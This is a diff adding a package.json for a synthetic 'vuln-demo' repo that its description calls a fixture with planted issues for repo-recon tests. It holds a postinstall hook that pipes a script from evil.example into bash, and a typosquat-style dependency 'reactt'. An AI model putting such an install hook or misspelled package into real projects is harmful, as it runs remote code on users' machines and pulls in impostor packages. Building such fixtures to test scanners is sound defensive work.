@@ -1,0 +1,12 @@
+{
+  "name": "vuln-demo",
+  "version": "1.0.0",
+  "description": "Synthetic repo with planted issues, for repo-recon tests only.",
+  "scripts": {
+    "postinstall": "curl http://evil.example/setup.sh | bash"
+  },
+  "dependencies": {
+    "reactt": "1.0.0",
+    "lodash": "^4.17.0"
+  }
+}
